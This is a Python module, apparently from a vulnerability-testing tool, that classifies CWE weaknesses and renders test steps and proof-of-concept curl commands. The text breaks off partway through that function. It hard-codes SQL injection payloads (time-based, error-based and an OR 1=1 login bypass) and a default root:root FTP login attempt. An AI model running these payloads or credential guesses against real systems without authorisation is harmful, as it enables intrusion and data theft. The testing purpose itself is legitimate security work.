"""Declarative scenario catalog manager and rendering engine for CKG."""

from __future__ import annotations

from dataclasses import dataclass, field
from importlib.resources import files
from pathlib import Path
import re
from threading import Lock
from typing import Any, ClassVar
import yaml


def _find_catalog_path(explicit_path: Path | str | None = None) -> Path:
    if explicit_path:
        p = Path(explicit_path)
        if p.exists():
            return p
    for candidate in (
        Path("registry/scenario_catalog.yaml"),
        Path(__file__).resolve().parents[3] / "registry" / "scenario_catalog.yaml",
        Path(__file__).resolve().parents[4] / "registry" / "scenario_catalog.yaml",
    ):
        if candidate.exists():
            return candidate
    return Path("registry/scenario_catalog.yaml")


def _load_catalog(explicit_path: Path | str | None = None) -> dict[str, Any]:
    if explicit_path is not None:
        path = _find_catalog_path(explicit_path)
        if not path.is_file():
            raise FileNotFoundError(f"scenario catalog does not exist: {path}")
        return yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    try:
        resource = files("ckg").joinpath("registry/scenario_catalog.yaml")
        if resource.is_file():
            return yaml.safe_load(resource.read_text(encoding="utf-8")) or {}
    except (ModuleNotFoundError, FileNotFoundError):
        pass
    # Source-tree compatibility only; an installed wheel always receives the
    # package resource declared in pyproject.toml.
    path = _find_catalog_path()
    if path.is_file():
        return yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    raise FileNotFoundError("packaged scenario catalog is missing")


@dataclass(frozen=True)
class ScenarioCatalog:
    """Catalog of scenario testing variants, CWE taxonomy mappings, and rendering templates."""

    categories: dict[str, dict[str, Any]]
    surface_detectors: dict[str, Any]
    tech_detectors: dict[str, Any]
    templates: dict[str, Any] = field(default_factory=dict)

    _instance: ClassVar[ScenarioCatalog | None] = None
    _instance_lock: ClassVar[Lock] = Lock()

    @classmethod
    def get_default(cls, catalog_path: Path | str | None = None) -> ScenarioCatalog:
        if cls._instance is not None and catalog_path is None:
            return cls._instance
        with cls._instance_lock:
            if cls._instance is not None and catalog_path is None:
                return cls._instance
            raw = _load_catalog(catalog_path)
            instance = cls(
                categories=raw.get("categories", {}),
                surface_detectors=raw.get("surface_detectors", {}),
                tech_detectors=raw.get("tech_detectors", {}),
                templates=raw.get("templates", {}),
            )
            if catalog_path is None:
                cls._instance = instance
            return instance

    def _template(self, key: str, **values: Any) -> str:
        """Render a catalog-owned text template without mixing prose into code."""
        current: Any = self.templates or _load_catalog().get("templates", {})
        for part in key.split("."):
            if not isinstance(current, dict) or part not in current:
                raise KeyError(f"scenario catalog template is missing: {key}")
            current = current[part]
        if not isinstance(current, str):
            raise TypeError(f"scenario catalog template is not a string: {key}")
        rendered = current
        for name, value in values.items():
            rendered = rendered.replace(f"⟦{name}⟧", str(value))
        return rendered

    def _template_list(self, key: str, **values: Any) -> tuple[str, ...]:
        """Render a catalog-owned sequence of text templates."""
        current: Any = self.templates or _load_catalog().get("templates", {})
        for part in key.split("."):
            if not isinstance(current, dict) or part not in current:
                raise KeyError(f"scenario catalog template is missing: {key}")
            current = current[part]
        if not isinstance(current, list):
            raise TypeError(f"scenario catalog template is not a list: {key}")
        return tuple(
            self._render_template_value(item, values, key) for item in current
        )

    def _render_template_value(self, value: Any, values: dict[str, Any], key: str) -> str:
        if not isinstance(value, str):
            raise TypeError(f"scenario catalog template is not a string: {key}")
        rendered = value
        for name, replacement in values.items():
            rendered = rendered.replace(f"⟦{name}⟧", str(replacement))
        return rendered

    def classify_weaknesses(self, weakness_ids: set[str]) -> str | None:
        """Classify a set of weakness IDs into a canonical category defined in catalog."""
        for cat_name, cat_data in self.categories.items():
            cat_cwes = set(cat_data.get("cwe_ids", []))
            if weakness_ids & cat_cwes:
                return cat_name
        return None

    def group_weaknesses(self, weakness_ids: set[str]) -> dict[str, tuple[str, ...]]:
        """Partition weaknesses by catalog family without inventing a composite."""
        grouped: dict[str, tuple[str, ...]] = {}
        for cat_name, cat_data in self.categories.items():
            members = tuple(sorted(weakness_ids & set(cat_data.get("cwe_ids", []))))
            if members:
                grouped[cat_name] = members
        return grouped

    def get_variants(
        self,
        category: str | None,
        component_kind: str | None = None,
    ) -> list[dict[str, Any]]:
        """Retrieve applicable test variants for the category, filtering by component requirements."""
        if not category or category not in self.categories:
            return []
        raw_variants = self.categories[category].get("variants", [])
        filtered: list[dict[str, Any]] = []
        for v in raw_variants:
            req_comp = v.get("requires_component")
            if req_comp and component_kind != req_comp:
                continue
            filtered.append(dict(v))
        return filtered

    def infer_component_semantics(self, artifacts: dict[str, Any], text: str) -> dict[str, Any]:
        """Infer component type and interaction protocol using declarative detectors."""
        endpoints = artifacts.get("endpoints", [])
        params = [p.lower() for p in artifacts.get("parameters", [])]
        ep_str = " ".join(endpoints).lower()
        full_text = f"{text} {ep_str}".lower()

        # Check for explicitly stated HTTP method in vulnerability text
        method_m = re.search(
            r"\b(?:via|using|crafted|sending\s+a\s+crafted|sending\s+a|HTTP)\s+(GET|POST|PUT|DELETE|PATCH)\b"
            r"|\b(GET|POST|PUT|DELETE|PATCH)\s+(?:request|method|call|verb|endpoint)\b",
            text,
            re.IGNORECASE,
        )
        explicit_method = (method_m.group(1) or method_m.group(2)).upper() if method_m else None

        # Login form detector
        login_cfg = self.surface_detectors.get("login", {})
        ep_login = any(k in ep_str for k in login_cfg.get("endpoint_keywords", ["login", "signin", "doctorlogin"]))
        has_login_params = any(any(lp in p for lp in login_cfg.get("param_keywords", ["password", "pswd", "passwd", "pwd"])) for p in params)
        has_login_text = bool(re.search(r"\blogin\s+(?:form|page|screen|endpoint|portal|action)\b", text, re.IGNORECASE))
        if ep_login or has_login_params or has_login_text:
            return {
                "kind": "LOGIN_FORM",
                "name": login_cfg.get("display_name", "LOGIN_FORM"),
                "method": explicit_method or "POST",
                "content_type": "application/x-www-form-urlencoded",
                "is_auth_surface": True,
            }

        # Content renderer detector
        ren_keywords = self.surface_detectors.get("renderer", {}).get("keywords", ["renderer", "markdown", "template", "bbcode", "parser"])
        if any(k in full_text for k in ren_keywords):
            return {
                "kind": "CONTENT_RENDERER",
                "name": self.surface_detectors.get("renderer", {}).get("display_name", "CONTENT_RENDERER"),
                "method": explicit_method or ("POST" if "json" in full_text or "post" in full_text else "GET"),
                "content_type": "application/json" if "json" in full_text else "application/x-www-form-urlencoded",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        # Path overwrite detector
        if bool(re.search(r"\bfile path validation\b|\bpath validation\b|\bpath traversal\b|\barbitrary file overwrite\b", text, re.IGNORECASE)):
            return {
                "kind": "FILE_OVERWRITE",
                "name": self.surface_detectors.get("file_overwrite", {}).get("display_name", "FILE_OVERWRITE"),
                "method": explicit_method or "POST",
                "content_type": "application/x-www-form-urlencoded",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        # Upload detector
        upload_keywords = self.surface_detectors.get("upload", {}).get("keywords", ["upload", "attachment", "avatar", "file_upload"])
        if any(k in full_text for k in upload_keywords):
            return {
                "kind": "FILE_UPLOAD",
                "name": self.surface_detectors.get("upload", {}).get("display_name", "FILE_UPLOAD"),
                "method": explicit_method or "POST",
                "content_type": "multipart/form-data",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        # API detector
        api_keywords = self.surface_detectors.get("api", {}).get("keywords", ["getdataofjson", "json", "api/", "/api", "rest", "graphql", "rpc"])
        if any(k in full_text for k in api_keywords):
            default_method = "GET" if "getdata" in full_text or "search" in full_text else "POST"
            return {
                "kind": "DATA_API",
                "name": self.surface_detectors.get("api", {}).get("display_name", "DATA_API"),
                "method": explicit_method or default_method,
                "content_type": "application/json",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        # Search detector
        search_keywords = self.surface_detectors.get("search", {}).get("keywords", ["search", "find", "query", "filter", "keyword"])
        if any(k in full_text for k in search_keywords) or any("q" == p or "keyword" in p for p in params):
            return {
                "kind": "SEARCH_QUERY",
                "name": self.surface_detectors.get("search", {}).get("display_name", "SEARCH_QUERY"),
                "method": explicit_method or "GET",
                "content_type": "application/x-www-form-urlencoded",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        # Container runtime detector
        cont_keywords = self.surface_detectors.get("container", {}).get("keywords", ["runc", "container", "docker", "libcontainer", "cgroup", "namespace", "podman"])
        if any(k in full_text for k in cont_keywords):
            return {
                "kind": "CONTAINER_RUNTIME",
                "name": self.surface_detectors.get("container", {}).get("display_name", "CONTAINER_RUNTIME"),
                "method": explicit_method or "EXEC",
                "content_type": "process/ipc",
                "is_auth_surface": artifacts.get("is_authenticated", False),
            }

        return {
            "kind": "GENERIC_REQUEST",
            "name": self.surface_detectors.get("generic", {}).get("display_name", "GENERIC_REQUEST"),
            "method": explicit_method or "GET",
            "content_type": "application/x-www-form-urlencoded",
            "is_auth_surface": artifacts.get("is_authenticated", False),
        }

    def infer_tech_stack(self, artifacts: dict[str, Any], text: str) -> dict[str, str]:
        """Infer underlying web technology and database engine from artifacts and description text."""
        endpoints = artifacts.get("endpoints", [])
        ep_str = " ".join(endpoints).lower()
        full_text = f"{text} {ep_str}".lower()

        backend = "Web Standard"
        for be, kws in self.tech_detectors.get("backends", {}).items():
            if any(k in full_text for k in kws):
                backend = be
                break

        db = "SQL Backend"
        for db_name, kws in self.tech_detectors.get("databases", {}).items():
            if any(k in full_text for k in kws):
                db = db_name
                break
        if db == "SQL Backend" and backend == "PHP":
            db = "MySQL / MariaDB"

        return {
            "backend": backend,
            "database": db,
            "summary": f"{backend} & {db}",
        }

    def render_title(
        self,
        category: str | None,
        var: dict[str, Any],
        artifacts: dict[str, Any],
        component: dict[str, Any] | None = None,
        tech: dict[str, str] | None = None,
    ) -> str:
        """Render readable scenario title."""
        base_name = var["name"]
        if category == "SQLI" and artifacts.get("is_order_by"):
            base_name = var.get("order_by_name", base_name.replace("SQL Injection", "ORDER BY SQL Injection"))
        params = artifacts.get("parameters", [])
        service = artifacts.get("services", [])
        comp = component or {}
        if params:
            param_list = ", ".join(params[:2])
            if comp.get("kind") == "LOGIN_FORM":
                return self._template("title.login_param", base_name=base_name, param_list=param_list)
            return self._template("title.param", base_name=base_name, param_list=param_list)
        if service:
            return self._template("title.service", base_name=base_name, service=service[0])
        if comp.get("name"):
            return self._template("title.component", base_name=base_name, component=comp["name"])
        return base_name

    def render_description(
        self,
        category: str | None,
        var: dict[str, Any],
        artifacts: dict[str, Any],
        component: dict[str, Any] | None = None,
        tech: dict[str, str] | None = None,
    ) -> str:
        """Render scenario premise and description."""
        params = artifacts.get("parameters", [])
        endpoints = artifacts.get("endpoints", [])
        services = artifacts.get("services", [])
        ep_str = endpoints[0] if endpoints else "/<TARGET_ENDPOINT>"
        param_str = ", ".join(params) if params else self._template("defaults.input_parameter")
        comp = component or {"name": self._template("defaults.web_surface")}
        tech_info = tech or {
            "summary": self._template("defaults.web_database_summary"),
            "database": self._template("defaults.database"),
        }

        if category == "SQLI":
            is_order_by = artifacts.get("is_order_by", False)
            if "time_based" in var.get("id_suffix", ""):
                if is_order_by:
                    return self._template("description.sqli.time_order", param=param_str, component=comp["name"], endpoint=ep_str, summary=tech_info["summary"])
                return self._template("description.sqli.time", param=param_str, component=comp["name"], endpoint=ep_str, summary=tech_info["summary"])
            if "auth_bypass" in var.get("id_suffix", ""):
                return self._template("description.sqli.auth_bypass", component=comp["name"], endpoint=ep_str, param=param_str)
            if is_order_by:
                return self._template("description.sqli.order", param=param_str, component=comp["name"], endpoint=ep_str, summary=tech_info["summary"], database=tech_info["database"])
            return self._template("description.sqli.error", param=param_str, component=comp["name"], endpoint=ep_str, summary=tech_info["summary"], database=tech_info["database"])
        if category == "CREDENTIALS":
            svc_str = services[0] if services else self._template("defaults.system_service")
            return self._template("description.credentials", service=svc_str)
        if category == "COMMAND_INJECTION":
            return self._template("description.command_injection", param=param_str, endpoint=ep_str)
        if category == "PATH_TRAVERSAL":
            return self._template("description.path_traversal", param=param_str, endpoint=ep_str)
        if category == "FILE_UPLOAD":
            return self._template("description.file_upload", component=comp["name"], endpoint=ep_str, param=param_str, summary=tech_info["summary"])
        if category == "XSS":
            return self._template("description.xss", param=param_str, endpoint=ep_str)
        if category == "SSRF":
            return self._template("description.ssrf")
        if category == "CONTAINER_ESCAPE":
            return self._template("description.container_escape", endpoint=ep_str)
        if category == "ACCESS_CONTROL":
            return self._template("description.access_control", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "AUTHENTICATION_BYPASS":
            return self._template("description.authentication_bypass", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "CSRF":
            return self._template("description.csrf", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "SSTI":
            return self._template("description.ssti", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "DESERIALIZATION":
            return self._template("description.deserialization", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "INFO_DISCLOSURE":
            return self._template("description.info_disclosure", component=comp["name"], endpoint=ep_str, param=param_str)
        if category == "CRYPTOGRAPHIC_FAILURES":
            return self._template("description.cryptographic_failures")
        if category == "MEMORY_CORRUPTION":
            return self._template("description.memory_corruption", param=param_str, endpoint=ep_str)
        if category == "DOS_RESOURCE_EXHAUSTION":
            return self._template("description.dos_resource_exhaustion", component=comp["name"], endpoint=ep_str, param=param_str)
        return self._template("description.default", category=category or "vulnerability", endpoint=ep_str)

    def render_steps(
        self,
        category: str | None,
        var: dict[str, Any],
        artifacts: dict[str, Any],
        component: dict[str, Any] | None = None,
        tech: dict[str, str] | None = None,
    ) -> tuple[str, ...]:
        """Render sequential testing steps for the scenario candidate."""
        params = artifacts.get("parameters", [])
        endpoints = artifacts.get("endpoints", [])
        services = artifacts.get("services", [])
        has_concrete_ep = bool(endpoints)
        ep_str = endpoints[0] if has_concrete_ep else "/<TARGET_ENDPOINT>"
        has_concrete_param = bool(params)
        param_first = params[0] if has_concrete_param else "<INPUT_PARAM>"
        n_art = artifacts.get("neighbor_artifacts", {})
        n_params = n_art.get("parameters", [])
        if has_concrete_param:
            param_label = self._template("steps.param_named", parameter=param_first)
        elif n_params:
            n_samples = ", ".join(f"'{p}'" for p in n_params[:2])
            param_label = self._template("steps.param_neighbor", samples=n_samples)
        else:
            param_label = self._template("steps.param_missing")
        comp = component or {"method": "GET", "content_type": "application/x-www-form-urlencoded"}
        tech_info = tech or {"database": self._template("defaults.database")}
        method = comp.get("method", "GET")
        ctype = comp.get("content_type", "application/x-www-form-urlencoded")
        db_name = tech_info.get("database", "CSDL")

        if category == "SQLI":
            is_order_by = artifacts.get("is_order_by", False)
            is_mssql = "Microsoft SQL Server" in db_name or "MSSQL" in db_name
            is_pg = "PostgreSQL" in db_name

            if "time_based" in var.get("id_suffix", ""):
                if is_order_by:
                    if is_mssql:
                        sleep_expr = "(SELECT CASE WHEN 1=1 THEN (WAITFOR DELAY '0:0:5') ELSE 0 END)"
                    elif is_pg:
                        sleep_expr = "(SELECT 1 FROM pg_sleep(5))"
                    else:
                        sleep_expr = "(SELECT 1 FROM (SELECT(SLEEP(5)))a)"
                    sleep_step = (
                        self._template("steps.sqli.time_order_payload", parameter=param_label, payload=sleep_expr)
                    )
                    step1_note = (
                        self._template("steps.sqli.time_order_baseline", method=method, endpoint=ep_str, content_type=ctype, parameter=param_label)
                    )
                else:
                    if is_mssql:
                        sleep_step = self._template("steps.sqli.time_mssql", parameter=param_label)
                    elif is_pg:
                        sleep_step = self._template("steps.sqli.time_postgresql", parameter=param_label)
                    else:
                        sleep_step = self._template("steps.sqli.time_generic", parameter=param_label)
                    step1_note = self._template("steps.sqli.time_baseline", method=method, endpoint=ep_str, content_type=ctype)

                return (
                    step1_note,
                    self._template("steps.sqli.time_measure", payload=sleep_step),
                    self._template("steps.sqli.time_analyze"),
                    self._template("steps.sqli.time_extract"),
                )
            if "auth_bypass" in var.get("id_suffix", ""):
                return (
                    self._template("steps.sqli.auth_baseline", method=method, endpoint=ep_str, parameters=", ".join(params[:2]) if params else "username, password"),
                    self._template("steps.sqli.auth_payload", parameter=param_label),
                    self._template("steps.sqli.auth_verify"),
                )
            # Error-based
            if is_order_by:
                if is_mssql:
                    error_fn = "(SELECT 1 FROM (SELECT CONVERT(int, @@version))a)"
                elif is_pg:
                    error_fn = "CAST((SELECT version()) AS INT)"
                else:
                    error_fn = "extractvalue(1, concat(0x7e, database()))"
                return (
                    self._template("steps.sqli.error_order_baseline", method=method, endpoint=ep_str, content_type=ctype, parameter=param_label),
                    self._template("steps.sqli.error_order_payload", payload=error_fn, parameter=param_label),
                    self._template("steps.sqli.error_extract", database=db_name),
                    self._template("steps.sqli.error_verify", database=db_name),
                )
            if is_mssql:
                error_fn = "1=CONVERT(int, (SELECT @@version))"
                error_step = self._template("steps.sqli.error_mssql", payload=error_fn, parameter=param_label)
            elif is_pg:
                error_fn = "1=CAST((SELECT version()) AS INT)"
                error_step = self._template("steps.sqli.error_postgresql", payload=error_fn, parameter=param_label)
            else:
                error_fn = "extractvalue(1, concat(0x7e, database()))"
                error_step = self._template("steps.sqli.error_generic", parameter=param_label)
            return (
                self._template("steps.sqli.error_baseline", method=method, endpoint=ep_str, content_type=ctype, parameter=param_label),
                self._template("steps.sqli.error_payload", payload=error_step),
                self._template("steps.sqli.error_table_extract", database=db_name),
                self._template("steps.sqli.error_verify", database=db_name),
            )
        if category == "CREDENTIALS":
            svc_name = services[0] if services else self._template("defaults.service")
            port = "21" if artifacts.get("is_ftp") else "80/443"
            return (
                self._template("steps.credentials.service", service=svc_name, port=port),
                self._template("steps.credentials.defaults"),
                self._template("steps.credentials.verify"),
            )
        if category == "COMMAND_INJECTION":
            return (
                self._template("steps.command_injection.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.command_injection.payload", parameter=param_label),
                self._template("steps.command_injection.verify"),
            )
        if category == "PATH_TRAVERSAL":
            return (
                self._template("steps.path_traversal.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.path_traversal.payload", parameter=param_label),
                self._template("steps.path_traversal.verify"),
            )
        if category == "FILE_UPLOAD":
            if comp.get("kind") == "FILE_OVERWRITE":
                auth_step = self._template("steps.file_overwrite.authenticated", role=artifacts.get("auth_role") or "subscriber") if artifacts.get("is_authenticated") else ""
                return (
                    self._template("steps.file_overwrite.locate", parameter=param_label, endpoint=ep_str),
                    self._template("steps.file_overwrite.payload", auth_step=auth_step, parameter=param_label),
                    self._template("steps.file_overwrite.verify"),
                )
            return (
                self._template("steps.file_upload.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.file_upload.payload", method=method, content_type=ctype),
                self._template("steps.file_upload.verify"),
            )
        if category == "XSS":
            return (
                self._template("steps.xss.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.xss.payload", parameter=param_label),
                self._template("steps.xss.verify"),
            )
        if category == "SSRF":
            return (
                self._template("steps.ssrf.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.ssrf.payload", parameter=param_label),
                self._template("steps.ssrf.verify"),
            )
        if category == "CONTAINER_ESCAPE":
            return (
                self._template("steps.container_escape.inspect"),
                self._template("steps.container_escape.payload", endpoint=ep_str),
                self._template("steps.container_escape.verify"),
            )
        if category == "ACCESS_CONTROL":
            return (
                self._template("steps.access_control.session", endpoint=ep_str, parameter=param_label),
                self._template("steps.access_control.payload", parameter=param_label),
                self._template("steps.access_control.verify"),
            )
        if category == "AUTHENTICATION_BYPASS":
            return (
                self._template("steps.authentication_bypass.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.authentication_bypass.payload", parameter=param_label),
                self._template("steps.authentication_bypass.verify"),
            )
        if category == "CSRF":
            return (
                self._template("steps.csrf.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.csrf.payload", method=method),
                self._template("steps.csrf.verify"),
            )
        if category == "SSTI":
            return (
                self._template("steps.ssti.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.ssti.payload", parameter=param_label),
                self._template("steps.ssti.verify"),
            )
        if category == "DESERIALIZATION":
            return (
                self._template("steps.deserialization.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.deserialization.payload", parameter=param_label),
                self._template("steps.deserialization.verify"),
            )
        if category == "INFO_DISCLOSURE":
            return (
                self._template("steps.info_disclosure.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.info_disclosure.payload"),
                self._template("steps.info_disclosure.verify"),
            )
        if category == "CRYPTOGRAPHIC_FAILURES":
            return (
                self._template("steps.cryptographic_failures.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.cryptographic_failures.payload"),
                self._template("steps.cryptographic_failures.verify"),
            )
        if category == "MEMORY_CORRUPTION":
            return (
                self._template("steps.memory_corruption.locate", parameter=param_label, endpoint=ep_str),
                self._template("steps.memory_corruption.payload"),
                self._template("steps.memory_corruption.verify"),
            )
        if category == "DOS_RESOURCE_EXHAUSTION":
            return (
                self._template("steps.dos_resource_exhaustion.locate", endpoint=ep_str, parameter=param_label),
                self._template("steps.dos_resource_exhaustion.payload", parameter=param_label),
                self._template("steps.dos_resource_exhaustion.verify"),
            )
        return (
            self._template("steps.default.locate", endpoint=ep_str),
            self._template("steps.default.payload", parameter=param_label),
            self._template("steps.default.verify"),
        )

    def render_poc(
        self,
        category: str | None,
        var: dict[str, Any],
        artifacts: dict[str, Any],
        vulnerability_id: str,
        component: dict[str, Any] | None = None,
        tech: dict[str, str] | None = None,
    ) -> str:
        """Render concrete, reproducible PoC command or payload script."""
        params = artifacts.get("parameters", [])
        fixed_params = artifacts.get("fixed_parameters", {})
        endpoints = artifacts.get("endpoints", [])
        services = artifacts.get("services", [])
        has_concrete_ep = bool(endpoints)
        ep = endpoints[0] if has_concrete_ep else "/<TARGET_ENDPOINT>"
        sep = "&" if "?" in ep else "?"
        comp = component or {"method": "GET", "content_type": "application/x-www-form-urlencoded"}
        tech_info = tech or {"database": "MySQL", "summary": "Web / CSDL"}
        method = comp.get("method", "GET")
        ctype = comp.get("content_type", "application/x-www-form-urlencoded")
        db_name = tech_info.get("database", "MySQL")
        timing_note = self._template("poc.curl.timing_note")

        fixed_query = "&".join(f"{k}={v}" for k, v in fixed_params.items())

        has_concrete_param = bool(params)
        p = params[0] if has_concrete_param else "<INPUT_PARAM>"

        binding_notes = []
        if not has_concrete_param:
            binding_notes.append(self._template("poc.binding.missing_parameter"))
            binding_notes.append(self._template("poc.binding.resolve_parameter"))
        if not has_concrete_ep:
            binding_notes.append(self._template("poc.binding.missing_endpoint"))
            binding_notes.append(self._template("poc.binding.resolve_endpoint"))
        n_art = artifacts.get("neighbor_artifacts", {})
        n_params = n_art.get("parameters", [])
        n_p_origins = n_art.get("param_origins", {})
        n_endpoints = n_art.get("endpoints", [])
        n_e_origins = n_art.get("endpoint_origins", {})

        neighbor_hints = []
        if not has_concrete_param and n_params:
            p_examples = ", ".join(self._template("poc.binding.parameter_example", parameter=param, origin=n_p_origins.get(param, self._template("defaults.neighbor"))) for param in n_params[:4])
            neighbor_hints.append(self._template("poc.binding.parameter_neighbors", examples=p_examples))

        if not has_concrete_ep and n_endpoints:
            e_examples = ", ".join(self._template("poc.binding.endpoint_example", endpoint=endp, origin=n_e_origins.get(endp, self._template("defaults.neighbor"))) for endp in n_endpoints[:3])
            neighbor_hints.append(self._template("poc.binding.endpoint_neighbors", examples=e_examples))

        if neighbor_hints:
            binding_notes.append(self._template("poc.binding.neighbor_header"))
            binding_notes.extend(neighbor_hints)

        if category == "SQLI" and not has_concrete_param:
            binding_notes.append(self._template("poc.binding.sqli_auth"))
        if artifacts.get("is_unauthenticated"):
            binding_notes.append(self._template("poc.binding.pre_auth"))
        note_str = ("\n".join(binding_notes) + "\n\n") if binding_notes else ""

        if category == "SQLI":
            is_order_by = artifacts.get("is_order_by", False)
            is_mssql = "Microsoft SQL Server" in db_name or "MSSQL" in db_name
            is_pg = "PostgreSQL" in db_name

            if "time_based" in var.get("id_suffix", ""):
                if is_order_by:
                    if is_mssql:
                        time_payload = "(SELECT%20CASE%20WHEN%201=1%20THEN%20(WAITFOR%20DELAY%20'0:0:5')%20ELSE%200%20END)"
                    elif is_pg:
                        time_payload = "(SELECT%201%20FROM%20pg_sleep(5))"
                    else:
                        time_payload = "(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)"
                    poc_hdr = self._template("poc.sqli.time_order_header", vulnerability_id=vulnerability_id, summary=tech_info["summary"])
                else:
                    if is_mssql:
                        time_payload = "1%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--"
                    elif is_pg:
                        time_payload = "1%27%3B%20SELECT%20pg_sleep(5)--"
                    else:
                        time_payload = "test%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)--%20-"
                    poc_hdr = self._template("poc.sqli.time_header", vulnerability_id=vulnerability_id, summary=tech_info["summary"])

                alt_poc = ""
                if len(params) > 1 and is_order_by:
                    alt_p = params[1]
                    alt_poc = self._template(
                        "poc.sqli.time_alternate",
                        parameter=alt_p,
                        endpoint=ep,
                        separator=sep,
                        payload=time_payload,
                    )

                db_alts = ""
                if not is_mssql and not is_pg:
                    if is_order_by:
                        db_alts = self._template("poc.sqli.time_db_alternates_order")
                    else:
                        db_alts = self._template("poc.sqli.time_db_alternates")

                post_alt = ""
                if method == "GET" and not has_concrete_ep:
                    post_alt = self._template(
                        "poc.sqli.time_post_alternate", endpoint=ep, parameter=p
                    )

                if method == "POST":
                    body_parts = []
                    if fixed_query:
                        body_parts.append(fixed_query)
                    body_parts.append(f"{p}={time_payload}")
                    if len(params) > 1:
                        body_parts.extend(f"{other}=test" for other in params[1:3])
                    body_str = "&".join(body_parts)
                    return (
                        f"{note_str}{poc_hdr}"
                        f'curl -i -s -w "\\n{timing_note}\\n" \\\n'
                        f'  -X POST "http://<TARGET_HOST>{ep}" \\\n'
                        f'  -H "Content-Type: {ctype}" \\\n'
                        f'  -d "{body_str}"'
                        f"{alt_poc}"
                        f"{db_alts}"
                    )
                query_parts = []
                if fixed_query:
                    query_parts.append(fixed_query)
                query_parts.append(f"{p}={time_payload}")
                full_query = "&".join(query_parts)
                return (
                    f"{note_str}{poc_hdr}"
                    f'curl -i -s -w "\\n{timing_note}\\n" \\\n'
                    f'  -X GET "http://<TARGET_HOST>{ep}{sep}{full_query}"'
                    f"{alt_poc}"
                    f"{db_alts}"
                    f"{post_alt}"
                )

            if "auth_bypass" in var.get("id_suffix", ""):
                bypass_payload = "admin%27%20OR%201%3D1--%20-"
                if method == "POST":
                    body_parts = []
                    if fixed_query:
                        body_parts.append(fixed_query)
                    body_parts.append(f"{p}={bypass_payload}")
                    if len(params) > 1:
                        body_parts.extend(f"{other}=random_pwd" for other in params[1:3])
                    body_str = "&".join(body_parts)
                    return (
                        f"{note_str}{self._template('poc.sqli.auth_header', vulnerability_id=vulnerability_id)}"
                        f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                        f'  -H "Content-Type: {ctype}" \\\n'
                        f'  -d "{body_str}"'
                    )
                query_parts = []
                if fixed_query:
                    query_parts.append(fixed_query)
                query_parts.append(f"{p}={bypass_payload}")
                full_query = "&".join(query_parts)
                return (
                    f"{note_str}{self._template('poc.sqli.auth_header', vulnerability_id=vulnerability_id)}"
                    f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{full_query}"'
                )

            # Error-based SQL Injection
            if is_order_by:
                if is_mssql:
                    error_payload = "(SELECT%201%20FROM%20(SELECT%20CONVERT(int%2C%20%40%40version))a)"
                elif is_pg:
                    error_payload = "CAST((SELECT%20version())%20AS%20INT)"
                else:
                    error_payload = "extractvalue(1%2Cconcat(0x7e%2Cdatabase()))"
                poc_hdr = self._template("poc.sqli.error_order_header", vulnerability_id=vulnerability_id, summary=tech_info["summary"])
            else:
                if is_mssql:
                    error_payload = "1%27%20AND%201%3DCONVERT(int%2C%20(SELECT%20%40%40version))--"
                elif is_pg:
                    error_payload = "1%27%20AND%201%3DCAST((SELECT%20version())%20AS%20INT)--"
                else:
                    error_payload = "test%27%20AND%20extractvalue(1%2C%20concat(0x7e%2C%20database()))--%20-"
                poc_hdr = self._template("poc.sqli.error_header", vulnerability_id=vulnerability_id, summary=tech_info["summary"])

            alt_poc = ""
            if len(params) > 1 and is_order_by:
                alt_p = params[1]
                alt_poc = self._template(
                    "poc.sqli.error_alternate",
                    parameter=alt_p,
                    endpoint=ep,
                    separator=sep,
                    payload=error_payload,
                )

            db_alts = ""
            if not is_mssql and not is_pg:
                if is_order_by:
                    db_alts = self._template("poc.sqli.error_db_alternates_order")
                else:
                    db_alts = self._template("poc.sqli.error_db_alternates")

            post_alt = ""
            if method == "GET" and not has_concrete_ep:
                post_alt = self._template(
                    "poc.sqli.error_post_alternate", endpoint=ep, parameter=p
                )

            if method == "POST":
                body_parts = []
                if fixed_query:
                    body_parts.append(fixed_query)
                body_parts.append(f"{p}={error_payload}")
                if len(params) > 1:
                    body_parts.extend(f"{other}=test" for other in params[1:3])
                body_str = "&".join(body_parts)
                return (
                    f"{note_str}{poc_hdr}"
                    f'curl -i -s -X POST "http://<TARGET_HOST>{ep}" \\\n'
                    f'  -H "Content-Type: {ctype}" \\\n'
                    f'  -d "{body_str}"'
                    f"{alt_poc}"
                    f"{db_alts}"
                )
            query_parts = []
            if fixed_query:
                query_parts.append(fixed_query)
            query_parts.append(f"{p}={error_payload}")
            full_query = "&".join(query_parts)
            return (
                f"{note_str}{poc_hdr}"
                f'curl -i -s -X GET "http://<TARGET_HOST>{ep}{sep}{full_query}"'
                f"{alt_poc}"
                f"{db_alts}"
                f"{post_alt}"
            )
        if category == "CREDENTIALS":
            if artifacts.get("is_ftp"):
                return (
                    f"{note_str}{self._template('poc.credentials.ftp_header', vulnerability_id=vulnerability_id)}"
                    f'curl -v --user "root:root" "ftp://<TARGET_HOST>:21/"\n\n'
                    f"{self._template('poc.credentials.ftp_alternate')}"
                    f"ftp -n <TARGET_HOST> 21 <<EOF\n"
                    f"user root root\n"
                    f"ls -la\n"
